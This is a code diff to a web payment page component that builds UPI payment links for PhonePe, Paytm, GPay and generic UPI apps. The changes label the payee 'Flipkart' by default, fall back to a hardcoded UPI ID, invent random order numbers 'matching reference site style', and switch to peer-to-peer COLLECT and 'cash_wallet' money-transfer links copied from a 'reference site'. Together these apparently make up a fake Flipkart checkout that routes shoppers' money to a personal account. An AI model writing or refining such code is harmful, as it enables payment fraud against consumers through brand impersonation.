@@ -773,42 +773,49 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   }, []);
 
   const handleAppPay = useCallback((app: string) => {
-    const isAndroid = typeof navigator !== 'undefined' && /Android/i.test(navigator.userAgent);
-    const isIOS = typeof navigator !== 'undefined' && /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const activePp = (phonepeUpiId || upiId || '03400C123L@mairtel').trim();
+    const activePt = (paytmUpiId || upiId || '03400C123L@mairtel').trim();
+    const activeName = (merchantName || 'Flipkart').trim();
+    const pn_encoded = encodeURIComponent(activeName);
     
-    const activeUpi = (app === 'phonepe' ? (phonepeUpiId || upiId) : app === 'paytm' ? (paytmUpiId || upiId) : upiId) || '03400C123L@mairtel';
-    const encName = encodeURIComponent(merchantName || 'Flipkart');
-    const orderAmt = Number(selling).toFixed(2);
-    const encNote = encodeURIComponent(`Paying To Flipkart ORDER${txnid}`);
-    const standardPayload = `pa=${activeUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
+    // Exact 10-digit random order number matching reference site style
+    const randomOrderId = Math.floor(Math.random() * 9000000000) + 1000000000;
+    const txnNote = `Paying To Flipkart ORDER${randomOrderId}`;
+    const amtNum = parseFloat(String(selling)) || 0;
+    const amtStr = amtNum.toFixed(2);
     
     let intent = "";
     if (app === "phonepe") {
-      if (isAndroid) {
-        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(`phonepe://pay?${standardPayload}`)};end`;
-      } else if (isIOS) {
-        intent = `phonepe://pay?${standardPayload}`;
-      } else {
-        intent = phonepeIntent || `upi://pay?${standardPayload}`;
+      // 1. Exact PhonePe native COLLECT payload from reference site
+      try {
+        const payload = {
+          p2pPaymentCheckoutParams: {
+            checkoutType: "COLLECT",
+            initialAmount: Math.round(amtNum * 100),
+            note: {
+              type: "text",
+              message: txnNote
+            },
+            supportedInstruments: -1
+          },
+          contact: {
+            type: "EXTERNAL_MERCHANT",
+            name: activeName,
+            vpa: activePp
+          }
+        };
+        const base64Data = typeof btoa !== 'undefined' ? btoa(JSON.stringify(payload)) : '';
+        intent = `phonepe://native?data=${encodeURIComponent(base64Data)}&id=p2ppayment`;
+      } catch (e) {
+        intent = phonepeIntent;
       }
     } else if (app === "paytm") {
-      if (isAndroid) {
-        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=${encodeURIComponent(`paytmmp://pay?${standardPayload}`)};end`;
-      } else if (isIOS) {
-        intent = `paytmmp://pay?${standardPayload}`;
-      } else {
-        intent = paytmIntent || `upi://pay?${standardPayload}`;
-      }
+      // 2. Exact Paytm cash_wallet scheme from reference site
+      intent = `paytmmp://cash_wallet?pa=${activePt}&pn=${pn_encoded}&am=${amtStr}&cu=INR&tn=${encodeURIComponent(txnNote)}&featuretype=money_transfer`;
     } else if (app === "gpay") {
-      if (isAndroid) {
-        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;S.browser_fallback_url=${encodeURIComponent(`tez://upi/pay?${standardPayload}`)};end`;
-      } else if (isIOS) {
-        intent = `gpay://upi/pay?${standardPayload}`;
-      } else {
-        intent = gpayIntent || `tez://upi/pay?${standardPayload}`;
-      }
+      intent = gpayIntent || `tez://upi/pay?pa=${upiId}&pn=${pn_encoded}&am=${amtStr}&cu=INR&tn=${encodeURIComponent(txnNote)}`;
     } else {
-      intent = upiUrl || `upi://pay?${standardPayload}`;
+      intent = upiUrl || `upi://pay?pa=${activePp}&pn=${pn_encoded}&am=${amtStr}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=${randomOrderId}`;
     }
 
     if (intent) {
